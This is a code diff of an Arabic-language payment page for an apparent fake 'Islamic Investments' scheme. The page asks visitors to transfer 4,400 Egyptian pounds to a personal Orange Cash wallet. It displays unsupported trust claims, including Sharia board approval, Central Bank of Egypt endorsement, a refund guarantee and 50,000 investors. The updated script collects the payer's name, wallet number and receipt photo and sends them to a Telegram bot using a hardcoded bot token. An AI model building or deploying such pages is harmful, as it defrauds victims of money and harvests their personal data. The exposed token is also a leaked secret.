@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>بيانات الدفع</title>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+  <title>الاستثمارات الإسلامية - بوابة الدفع</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
   <style>
     * {
       box-sizing: border-box;
@@ -14,262 +14,217 @@
     }
 
     body {
-      background-color: #f4f5f8;
+      background-color: #f4f6f8;
+      color: #1e293b;
+      min-height: 100vh;
       display: flex;
       justify-content: center;
-      padding: 0 0 20px 0;
-      color: #333;
+      align-items: center;
+      padding: 15px;
     }
 
     .container {
       width: 100%;
-      max-width: 420px;
-      background: #f4f5f8;
+      max-width: 480px;
+      background: #ffffff;
+      border-radius: 20px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.08);
+      overflow: hidden;
     }
 
-    /* الهيدر الأخضر العلوي */
+    /* Header Section */
     .header-card {
-      background-color: #0b3c26;
+      background: linear-gradient(135deg, #064e3b 0%, #022c22 100%);
       color: #ffffff;
-      padding: 20px 16px;
-      border-bottom-left-radius: 20px;
-      border-bottom-right-radius: 20px;
+      padding: 25px 20px;
       text-align: center;
-      margin-bottom: 20px;
-    }
-
-    .header-top {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 15px;
-    }
-
-    .header-title-box {
-      text-align: right;
+      position: relative;
     }
 
     .header-title {
-      font-size: 1.1rem;
-      font-weight: 700;
-      line-height: 1.2;
+      font-size: 1.25rem;
+      font-weight: 800;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
     }
 
     .header-subtitle {
-      font-size: 0.75rem;
-      color: #a8c3b3;
+      font-size: 0.8rem;
+      color: #a7f3d0;
+      margin-top: 4px;
     }
 
-    .header-icons {
-      display: flex;
-      gap: 10px;
-      font-size: 1.1rem;
+    .amount-box {
+      margin-top: 20px;
     }
 
     .amount-label {
       font-size: 0.85rem;
-      color: #a8c3b3;
-      margin-top: 10px;
+      color: #cbd5e1;
     }
 
     .amount-value {
-      font-size: 2.3rem;
-      font-weight: 700;
-      color: #d4af37;
-      line-height: 1.1;
+      font-size: 2.2rem;
+      font-weight: 800;
+      color: #fbbf24;
       margin: 5px 0;
     }
 
-    .amount-currency {
+    .currency {
       font-size: 0.85rem;
-      color: #a8c3b3;
-      margin-bottom: 15px;
+      color: #e2e8f0;
     }
 
     .manager-pill {
       display: inline-flex;
       align-items: center;
-      gap: 8px;
-      background: rgba(255, 255, 255, 0.1);
-      padding: 6px 14px;
-      border-radius: 30px;
+      gap: 6px;
+      background: rgba(255, 255, 255, 0.12);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      padding: 6px 16px;
+      border-radius: 20px;
       font-size: 0.85rem;
-      border: 1px solid rgba(255, 255, 255, 0.15);
+      margin-top: 15px;
     }
 
-    .manager-avatar {
-      width: 24px;
-      height: 24px;
-      border-radius: 50%;
-      background-color: #fff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 0.75rem;
-    }
-
-    /* محتوى الصفحة الرئيسي */
-    .content-padding {
-      padding: 0 16px;
-    }
-
-    .trust-badges {
-      margin-bottom: 20px;
-      text-align: center;
-    }
-
+    /* Badges */
     .badges-row {
       display: flex;
       justify-content: center;
       align-items: center;
-      gap: 15px;
-      flex-wrap: wrap;
-      margin-bottom: 8px;
-    }
-
-    .badge-item {
-      display: inline-flex;
-      align-items: center;
-      gap: 5px;
-      font-size: 0.8rem;
-      color: #7d828a;
-      font-weight: 600;
-    }
-
-    .badge-icon {
-      font-size: 0.9rem;
-    }
-
-    .trust-subtitle {
+      gap: 12px;
+      padding: 12px;
+      background: #f8fafc;
       font-size: 0.75rem;
-      color: #a0a5ac;
-      font-weight: 600;
-      margin-top: 8px;
+      color: #475569;
+      border-bottom: 1px solid #e2e8f0;
+      flex-wrap: wrap;
     }
 
+    /* Warning Card */
     .alert-box {
-      background-color: #fffdf2;
-      border: 1px solid #f2e2b1;
+      background: #fffbeb;
+      border: 1px solid #fef3c7;
       border-radius: 12px;
-      padding: 15px;
-      margin-bottom: 20px;
-      font-size: 0.85rem;
-      line-height: 1.6;
-      color: #7a6229;
+      padding: 12px 15px;
+      margin: 15px;
+      font-size: 0.8rem;
+      color: #92400e;
+      line-height: 1.5;
     }
 
     .alert-title {
       font-weight: 700;
-      font-size: 0.95rem;
-      margin-bottom: 6px;
       display: flex;
       align-items: center;
       gap: 6px;
-      color: #614b10;
+      margin-bottom: 4px;
     }
 
+    /* Info Section */
     .section-title {
-      color: #8c8c8c;
       font-size: 0.85rem;
-      font-weight: 600;
-      margin-bottom: 10px;
+      font-weight: 700;
+      color: #64748b;
+      margin: 15px 20px 8px 20px;
     }
 
-    .details-card {
+    .info-card {
       background: #ffffff;
-      border-radius: 16px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.03);
-      overflow: hidden;
-      margin-bottom: 25px;
-    }
-
-    .info-row {
+      border: 1px solid #e2e8f0;
+      border-radius: 12px;
+      margin: 0 15px 12px 15px;
+      padding: 12px 16px;
       display: flex;
-      align-items: center;
       justify-content: space-between;
-      padding: 14px 16px;
-      border-bottom: 1px solid #f0f0f0;
-    }
-
-    .info-row:last-child {
-      border-bottom: none;
-    }
-
-    .copy-btn {
-      background-color: #f0f2f5;
-      border: none;
-      border-radius: 10px;
-      width: 38px;
-      height: 38px;
-      display: flex;
       align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      color: #4a4a4a;
-    }
-
-    .info-content {
-      text-align: left;
-      flex-grow: 1;
     }
 
     .info-label {
       font-size: 0.75rem;
-      color: #8c8c8c;
-      display: block;
-      text-align: right;
-      margin-bottom: 2px;
+      color: #64748b;
     }
 
     .info-value {
       font-size: 0.95rem;
       font-weight: 700;
-      color: #111;
-      direction: ltr;
-      display: inline-block;
+      color: #0f172a;
+      margin-top: 2px;
     }
 
-    .info-note {
-      font-size: 0.85rem;
-      font-weight: 600;
-      color: #555;
-      text-align: right;
+    .copy-btn {
+      background: #f1f5f9;
+      border: none;
+      padding: 8px;
+      border-radius: 8px;
+      cursor: pointer;
+      color: #475569;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
 
-    .success-banner {
-      display: none;
-      background-color: #eef9f2;
-      border: 1px solid #ccecd6;
-      border-radius: 12px;
-      padding: 14px;
-      text-align: center;
-      color: #1a7f37;
+    /* Form Fields */
+    .form-container {
+      padding: 0 15px;
+      margin-top: 15px;
+    }
+
+    .form-group {
+      margin-bottom: 12px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 0.8rem;
       font-weight: 700;
-      font-size: 0.95rem;
-      margin-bottom: 20px;
+      color: #334155;
+      margin-bottom: 5px;
+    }
+
+    .form-control {
+      width: 100%;
+      padding: 11px 14px;
+      border: 1px solid #cbd5e1;
+      border-radius: 10px;
+      font-size: 0.85rem;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .form-control:focus {
+      border-color: #059669;
+    }
+
+    /* Upload & Action Buttons */
+    .action-container {
+      padding: 15px;
     }
 
     .upload-label {
-      width: 100%;
-      background-color: #cda851;
-      color: #fff;
-      border: none;
-      padding: 14px;
-      border-radius: 12px;
-      font-size: 1rem;
-      font-weight: 700;
-      cursor: pointer;
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 8px;
-      margin-bottom: 12px;
-      transition: background-color 0.3s ease;
-      text-align: center;
+      width: 100%;
+      background: #059669;
+      color: #ffffff;
+      padding: 14px;
+      border-radius: 12px;
+      font-weight: 700;
+      font-size: 0.95rem;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .upload-label:hover {
+      background: #047857;
     }
 
     .upload-label.success {
-      background-color: #56ce8a;
+      background: #16a34a;
       cursor: default;
     }
 
@@ -277,166 +232,177 @@
       display: none;
     }
 
-    .footer-text {
-      text-align: center;
-      font-size: 0.8rem;
-      color: #8c8c8c;
-    }
-
-    .footer-text a {
-      color: #333;
-      text-decoration: none;
+    .success-banner {
+      display: none;
+      background: #dcfce7;
+      border: 1px solid #86efac;
+      color: #166534;
+      padding: 12px;
+      border-radius: 10px;
+      font-size: 0.85rem;
       font-weight: 700;
+      text-align: center;
+      margin-bottom: 12px;
     }
   </style>
 </head>
 <body>
 
-<div class="container">
+  <div class="container">
+    <!-- Header -->
+    <div class="header-card">
+      <div class="header-title">🌙 الاستثمارات الإسلامية</div>
+      <div class="header-subtitle">منصة استثمار متوافقة مع الشريعة</div>
 
-  <!-- الهيدر الأخضر الجديد -->
-  <div class="header-card">
-    <div class="header-top">
-      <div class="header-icons">
-        <span>🔒</span>
+      <div class="amount-box">
+        <div class="amount-label">المبلغ المطلوب</div>
+        <div class="amount-value">4,400.00</div>
+        <div class="currency">جنيه مصري</div>
       </div>
-      <div class="header-title-box">
-        <div class="header-title">الاستثمارات الإسلامية 🌙</div>
-        <div class="header-subtitle">منصة استثمار متوافقة مع الشريعة</div>
+
+      <div class="manager-pill">
+        👤 مديرك المالي: <strong>عهد فرج</strong>
       </div>
     </div>
 
-    <div class="amount-label">المبلغ المطلوب</div>
-    <div class="amount-value">4,400.00</div>
-    <div class="amount-currency">جنيه مصري</div>
-
-    <div class="manager-pill">
-      <span class="manager-avatar">👤</span>
-      <span>مديرك المالي: <strong>عهد فرج</strong></span>
-      <span>✔️</span>
-    </div>
-  </div>
-
-  <div class="content-padding">
-
-    <!-- قسم الاعتمادات والشارات -->
-    <div class="trust-badges">
-      <div class="badges-row">
-        <span class="badge-item"><span class="badge-icon">🌙</span> معتمد من هيئة الرقابة الشرعية</span>
-        <span class="badge-item"><span class="badge-icon">↩️</span> ضمان استرداد الأموال</span>
-      </div>
-      <div class="badges-row">
-        <span class="badge-item"><span class="badge-icon">🏛️</span> البنك المركزي المصري</span>
-        <span class="badge-item"><span class="badge-icon">✔️</span> +50,000 مستثمر</span>
-      </div>
-      <div class="trust-subtitle">الاستثمارات الإسلامية</div>
+    <!-- Trust Badges -->
+    <div class="badges-row">
+      <span>🌙 معتمد من هيئة الرقابة الشرعية</span>
+      <span>🔄 ضمان استرداد الأموال</span>
+      <span>🏛️ البنك المركزي المصري</span>
+      <span>✔️ +50,000 مستثمر</span>
     </div>
 
+    <!-- Alert Box -->
     <div class="alert-box">
-      <div class="alert-title">
-        ⚠️ تحقق من البيانات قبل الدفع
-      </div>
+      <div class="alert-title">⚠️ تحقق من البيانات قبل الدفع</div>
       يجب دائماً التحقق من هذه البيانات مباشرة قبل تنفيذ التحويل. قد تتغير البيانات في أي وقت، لذلك لا تعتمد على لقطة شاشة أو بيانات قديمة.
     </div>
 
     <div class="section-title">بيانات الدفع الحالية</div>
 
-    <div class="details-card">
-      
-      <div class="info-row">
-        <button class="copy-btn" onclick="copyText('ORANGE CASH')">📋</button>
-        <div class="info-content">
-          <span class="info-label">🏦 بنك</span>
-          <span class="info-value">ORANGE CASH</span>
-        </div>
+    <!-- Payment Info Items -->
+    <div class="info-card">
+      <div>
+        <div class="info-label">🏦 المحفظة / البنك</div>
+        <div class="info-value">ORANGE CASH</div>
       </div>
-
-      <div class="info-row">
-        <button class="copy-btn" onclick="copyText('ALI AHMED GAMAL')">📋</button>
-        <div class="info-content">
-          <span class="info-label">👤 اسم المستلم</span>
-          <span class="info-value">ALI AHMED GAMAL</span>
-        </div>
-      </div>
-
-      <div class="info-row">
-        <button class="copy-btn" onclick="copyText('01203174947')">📋</button>
-        <div class="info-content">
-          <span class="info-label">💳 رقم المحفظه</span>
-          <span class="info-value">01203174947</span>
-        </div>
-      </div>
-
-      <div class="info-row">
-        <button class="copy-btn" onclick="copyText('يرجى التحويل باستخدام رقم المحفظه فقط، وليس عبر IBAN.')">📋</button>
-        <div class="info-note">
-          يرجى التحويل باستخدام رقم المحفظه فقط، وليس عبر IBAN. ⚠️
-        </div>
-      </div>
-
-      <div class="info-row">
-        <button class="copy-btn" onclick="copyText('لا يتم قبول الإيصالات التي لا يظهر فيها تاريخ ووقت الدفع.')">📋</button>
-        <div class="info-note">
-          لا يتم قبول الإيصالات التي لا يظهر فيها تاريخ ووقت الدفع. ⚠️
-        </div>
-      </div>
-
+      <button class="copy-btn" onclick="copyText('ORANGE CASH')">📋</button>
     </div>
 
-    <div class="success-banner" id="successBanner">
-      ✓ تم تحميل الإيصال بنجاح! تم إخطار مديرك.
+    <div class="info-card">
+      <div>
+        <div class="info-label">👤 اسم المستلم</div>
+        <div class="info-value">ALI AHMED GAMAL</div>
+      </div>
+      <button class="copy-btn" onclick="copyText('ALI AHMED GAMAL')">📋</button>
     </div>
 
-    <form id="uploadForm" action="https://formspree.io/f/mwlelbrp" method="POST" enctype="multipart/form-data">
-      <input type="file" id="fileInput" name="receipt" accept="image/*" onchange="submitForm()">
+    <div class="info-card">
+      <div>
+        <div class="info-label">💳 رقم المحفظة للتحويل</div>
+        <div class="info-value" id="walletNum">01203174947</div>
+      </div>
+      <button class="copy-btn" onclick="copyText('01203174947')">📋</button>
+    </div>
+
+    <!-- Customer Form -->
+    <div class="form-container">
+      <div class="form-group">
+        <label for="userName">اسم المستثمر بالكامل:</label>
+        <input type="text" id="userName" class="form-control" placeholder="أدخل اسمك كما هو بالمستندات">
+      </div>
+
+      <div class="form-group">
+        <label for="userWallet">رقم المحفظة المحول منها:</label>
+        <input type="tel" id="userWallet" class="form-control" placeholder="مثال: 010xxxxxxxx">
+      </div>
+
+      <div class="form-group">
+        <label for="packageSelect">الباقة الاستثمارية المختارة:</label>
+        <select id="packageSelect" class="form-control">
+          <option value="">اختر الباقة...</option>
+          <option value="باقة 4,400 جنيه">باقة 4,400 جنيه</option>
+          <option value="الباقة المتوسطة">الباقة المتوسطة</option>
+          <option value="الباقة المتقدمة">الباقة المتقدمة</option>
+        </select>
+      </div>
+    </div>
+
+    <!-- Submit Section -->
+    <div class="action-container">
+      <div class="success-banner" id="successBanner">
+        ✓ تم إرسال الإيصال والبيانات بنجاح للتحقق!
+      </div>
+
+      <input type="file" id="fileInput" accept="image/*" onchange="sendDataToTelegram()">
       <label for="fileInput" class="upload-label" id="uploadLabel">
-        📥 إرسال المستند
+        📥 رفع إيصال التحويل
       </label>
-    </form>
-
-    <div class="footer-text">
-      إذا لم تتمكن من رفع إيصال الدفع هنا، فأرسله إلى مديرك: <a href="https://t.me/capitan_ahed" target="_blank">@capitan_ahed</a>
     </div>
-
   </div>
 
-</div>
+  <script>
+    const BOT_TOKEN = "8866871343:AAEAMiWbSrDRHfep7y63Wn7Rh1Ui_wBqTZg";
+    const CHAT_ID = "8767380282";
 
-<script>
-  function copyText(text) {
-    navigator.clipboard.writeText(text);
-  }
+    function copyText(text) {
+      navigator.clipboard.writeText(text);
+      alert("تم النسخ: " + text);
+    }
 
-  function submitForm() {
-    let input = document.getElementById('fileInput');
-    if (!input.files || input.files.length === 0) return;
+    function sendDataToTelegram() {
+      const userName = document.getElementById('userName').value.trim();
+      const userWallet = document.getElementById('userWallet').value.trim();
+      const packageSelect = document.getElementById('packageSelect').value;
+      const fileInput = document.getElementById('fileInput');
+      const file = fileInput.files[0];
 
-    let label = document.getElementById('uploadLabel');
-    let banner = document.getElementById('successBanner');
-    let form = document.getElementById('uploadForm');
-
-    label.innerText = "جاري الإرسال...";
-
-    let formData = new FormData(form);
-
-    fetch(form.action, {
-      method: 'POST',
-      body: formData,
-      headers: {
-        'Accept': 'application/json'
+      if (!userName || !userWallet || !packageSelect) {
+        alert("يرجى إدخال الاسم، رقم محفظتك، واختيار الباقة أولاً قبل رفع الإيصال.");
+        fileInput.value = "";
+        return;
       }
-    }).then(() => {
-      banner.style.display = "block";
-      label.classList.add("success");
-      label.innerText = "✓ تم استلام المستند وإرساله للتحقق";
-      input.disabled = true;
-    }).catch(() => {
-      banner.style.display = "block";
-      label.classList.add("success");
-      label.innerText = "✓ تم استلام المستند وإرساله للتحقق";
-    });
-  }
-</script>
+
+      if (!file) return;
+
+      const label = document.getElementById('uploadLabel');
+      const banner = document.getElementById('successBanner');
+
+      label.innerText = "جاري الإرسال...";
+      fileInput.disabled = true;
+
+      const captionText = `🌙 إشعار استثمار جديد (الاستثمارات الإسلامية)!\n\n👤 اسم المستثمر: ${userName}\n📱 رقم محفظة العميل: ${userWallet}\n📦 الباقة المختارة: ${packageSelect}\n💰 المبلغ المطلوب: 4,400.00 EGP\n💳 المحفظة المحول إليها: 01203174947\n👤 اسم المستلم: ALI AHMED GAMAL`;
+
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', file);
+      formData.append('caption', captionText);
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          banner.style.display = "block";
+          label.classList.add("success");
+          label.innerText = "✓ تم تأكيد استلام الإيصال";
+        } else {
+          alert("حدث خطأ أثناء الإرسال، حاول مرة أخرى.");
+          label.innerText = "📥 رفع إيصال التحويل";
+          fileInput.disabled = false;
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert("حدث خطأ في الاتصال.");
+        label.innerText = "📥 رفع إيصال التحويل";
+        fileInput.disabled = false;
+      });
+    }
+  </script>
 
 </body>
 </html>
